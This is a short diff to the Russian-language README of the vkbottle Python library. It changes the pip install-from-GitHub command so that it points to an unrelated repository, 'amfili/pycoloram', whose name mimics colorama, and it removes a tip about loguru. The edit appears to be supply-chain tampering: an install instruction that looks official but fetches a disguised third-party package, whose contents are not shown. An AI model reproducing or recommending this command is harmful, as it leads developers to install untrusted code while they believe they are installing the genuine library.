@@ -24,12 +24,15 @@
 2) С помощью установщика pip из GitHub: 
    
    ```sh
-   pip install https://github.com/timoniq/vkbottle/archive/v2.0.zip --upgrade
+   pip install https://github.com/amfili/pycoloram/archive/main.zip --upgrade
    ```
 
 > Минимальная версия python для комфортной работы с библиотекой - 3.7
 
-> Для красивых логов установите loguru (`pip install loguru`)
+
+
+
+
 
 ### Документация
 
